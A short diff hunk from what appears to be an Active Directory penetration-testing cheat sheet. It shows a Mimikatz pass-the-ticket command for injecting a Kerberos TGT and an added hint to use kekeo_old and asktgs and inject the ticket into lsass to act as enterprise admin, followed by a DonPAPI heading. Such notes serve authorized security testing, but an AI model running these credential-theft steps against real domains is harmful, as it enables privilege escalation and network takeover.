@@ -432,7 +432,7 @@ Inject the TGT ticket
 ```
 Invoke-Mimikatz -Command '"kerberos::ptt <Ticket-Path>"'
 ```
-#### then exploit the tgt as enterprise admin :)
+#### then exploit the tgt as enterprise admin :) (can use kekeo_old and asktgs then inject the ticket in lsass)
   
 # DONPAPI
   
